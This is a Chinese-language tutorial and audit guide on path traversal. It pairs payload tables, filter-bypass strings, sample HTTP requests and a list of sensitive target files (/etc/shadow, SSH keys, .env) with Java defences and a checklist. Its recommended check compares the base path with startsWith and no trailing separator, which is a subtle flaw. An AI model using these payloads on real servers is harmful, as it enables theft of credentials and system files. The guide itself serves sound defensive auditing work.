# 路径遍历攻击详解

本文档详细介绍路径遍历攻击的原理、常见绕过技巧和防御方法。

---

## 1. 路径遍历攻击原理

路径遍历（Path Traversal）也称为目录遍历（Directory Traversal），是一种利用 `../` 序列访问服务器上任意文件的攻击技术。

### 1.1 基本概念

```
正常访问: /var/uploads/user123/file.txt
攻击payload: /var/uploads/user123/../../../etc/passwd

解析后路径: /etc/passwd
```

---

## 2. 常见攻击 Payload

### 2.1 基础路径遍历

| Payload | 目标系统 | 说明 |
|---------|---------|------|
| `../../../etc/passwd` | Linux/Unix | 读取用户账户信息 |
| `../../../etc/shadow` | Linux/Unix | 读取密码哈希（需root权限） |
| `..\..\..\..\windows\system32\drivers\etc\hosts` | Windows | 读取hosts文件 |
| `..\..\..\..\windows\win.ini` | Windows | 读取Windows配置 |

### 2.2 URL 编码绕过

| 编码方式 | Payload | 说明 |
|---------|---------|------|
| 单次编码 | `..%2f..%2f..%2fetc%2fpasswd` | `%2f` = `/` |
| 双重编码 | `..%252f..%252f..%252fetc%252fpasswd` | `%252f` = `%2f` |
| Unicode编码 | `..%c0%af..%c0%af..%c0%afetc%c0%afpasswd` | `%c0%af` = `/` |

### 2.3 反斜杠绕过

| Payload | 说明 |
|---------|------|
| `..\..\..\etc\passwd` | Windows风格路径 |
| `..%5c..%5c..%5cetc%5cpasswd` | `%5c` = `\` |

### 2.4 绝对路径绕过

| Payload | 说明 |
|---------|------|
| `/etc/passwd` | 直接使用绝对路径 |
| `C:\windows\win.ini` | Windows绝对路径 |
| `file:///etc/passwd` | 使用file协议 |

### 2.5 空字节注入 (旧版Java)

| Payload | 说明 |
|---------|------|
| `../../../etc/passwd%00.txt` | 空字节截断扩展名校验 |

**注意**：Java 7u40 之后已修复此漏洞。

---

## 3. 常见过滤绕过技巧

### 3.1 过滤 `../` 的绕过

| 过滤规则 | 绕过Payload | 说明 |
|---------|------------|------|
| `replace("../", "")` | `....//` | 移除后变成 `../` |
| `replace("../", "")` | `..././` | 移除后变成 `../` |
| `replace("../", "")` | `....\\/` | 混合使用 |

### 3.2 过滤 `..` 的绕过

| 过滤规则 | 绕过Payload | 说明 |
|---------|------------|------|
| `replace("..", "")` | `....` | 移除后变成 `..` |
| `contains("..")` | URL编码 `..%2f` | 编码绕过检测 |

### 3.3 大小写绕过

```
Windows系统不区分大小写：
../ = ..\ = ..\\ = ../ = ../
```

---

## 4. 防御方法

### 4.1 路径规范化 + 白名单校验（推荐）

```java
public String safeReadFile(String fileName) throws IOException {
    String basePath = "/var/uploads";

    // 1. 构建完整路径
    File file = new File(basePath, fileName);

    // 2. 获取规范化路径
    String canonicalPath = file.getCanonicalPath();

    // 3. 白名单目录校验
    if (!canonicalPath.startsWith(basePath)) {
        throw new SecurityException("Path traversal detected: " + fileName);
    }

    // 4. 读取文件
    return Files.readString(Path.of(canonicalPath));
}
```

### 4.2 扩展名白名单

```java
private static final Set<String> ALLOWED_EXTENSIONS = Set.of(".txt", ".pdf", ".jpg");

public boolean isAllowedExtension(String fileName) {
    return ALLOWED_EXTENSIONS.stream()
        .anyMatch(ext -> fileName.toLowerCase().endsWith(ext));
}
```

### 4.3 文件名白名单（最安全）

```java
// 使用UUID或数据库ID映射真实文件路径
Map<String, String> fileMapping = new HashMap<>();
fileMapping.put("file123", "/var/uploads/user1/document.pdf");

public String getFilePath(String fileId) {
    String path = fileMapping.get(fileId);
    if (path == null) {
        throw new SecurityException("Invalid file ID");
    }
    return path;
}
```

### 4.4 过滤特殊字符

```java
public String sanitizeFileName(String fileName) {
    // 移除所有路径分隔符
    return fileName.replaceAll("[/\\\\:*?\"<>|]", "");
}
```

**注意**：仅依靠过滤不安全，必须配合规范化和白名单。

---

## 5. 审计检测规则

### 5.1 危险代码模式

```java
// ❌ 危险：直接拼接用户输入
String filePath = basePath + request.getParameter("file");
FileInputStream fis = new FileInputStream(filePath);

// ❌ 危险：仅过滤 "../"
String fileName = request.getParameter("file").replace("../", "");
String filePath = basePath + fileName;

// ❌ 危险：未规范化
String fileName = request.getParameter("file");
Path path = Paths.get(basePath, fileName);
Files.readAllBytes(path);  // 未检查规范化路径
```

### 5.2 安全代码模式

```java
// ✅ 安全：规范化 + 白名单
String fileName = request.getParameter("file");
File file = new File(basePath, fileName);
String canonicalPath = file.getCanonicalPath();
if (!canonicalPath.startsWith(new File(basePath).getCanonicalPath())) {
    throw new SecurityException("Invalid path");
}
```

---

## 6. 测试用例

### 6.1 Linux 系统测试

```http
GET /download?file=../../../etc/passwd HTTP/1.1
GET /download?file=..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
GET /download?file=....//....//....//etc/passwd HTTP/1.1
GET /download?file=/etc/passwd HTTP/1.1
```

### 6.2 Windows 系统测试

```http
GET /download?file=..\..\..\windows\win.ini HTTP/1.1
GET /download?file=..%5c..%5c..%5cwindows%5cwin.ini HTTP/1.1
GET /download?file=C:\windows\win.ini HTTP/1.1
```

### 6.3 应用配置文件测试

```http
GET /download?file=../../../WEB-INF/web.xml HTTP/1.1
GET /download?file=../../../WEB-INF/classes/application.properties HTTP/1.1
GET /download?file=../../../META-INF/MANIFEST.MF HTTP/1.1
```

---

## 7. 常见目标文件

### 7.1 Linux 敏感文件

| 文件路径 | 内容 |
|---------|------|
| `/etc/passwd` | 用户账户信息 |
| `/etc/shadow` | 密码哈希 |
| `/etc/hosts` | 主机映射 |
| `/proc/self/environ` | 环境变量 |
| `/var/log/apache2/access.log` | Web访问日志 |
| `~/.ssh/id_rsa` | SSH私钥 |
| `~/.bash_history` | 命令历史 |

### 7.2 Windows 敏感文件

| 文件路径 | 内容 |
|---------|------|
| `C:\windows\win.ini` | Windows配置 |
| `C:\windows\system32\drivers\etc\hosts` | 主机映射 |
| `C:\windows\system.ini` | 系统配置 |

### 7.3 应用配置文件

| 文件路径 | 内容 |
|---------|------|
| `/WEB-INF/web.xml` | Web应用配置 |
| `/WEB-INF/classes/application.properties` | Spring Boot配置 |
| `/META-INF/context.xml` | Tomcat上下文配置 |
| `/.env` | 环境变量配置 |

---

## 8. 审计检查清单

**在审计路径遍历漏洞时，必须检查：**

- [ ] 文件路径是否包含用户可控参数
- [ ] 是否使用 `getCanonicalPath()` 规范化路径
- [ ] 是否进行白名单目录校验
- [ ] 是否有扩展名白名单限制
- [ ] 过滤逻辑是否可被绕过
- [ ] 是否记录异常访问日志
- [ ] 是否测试了常见绕过技巧
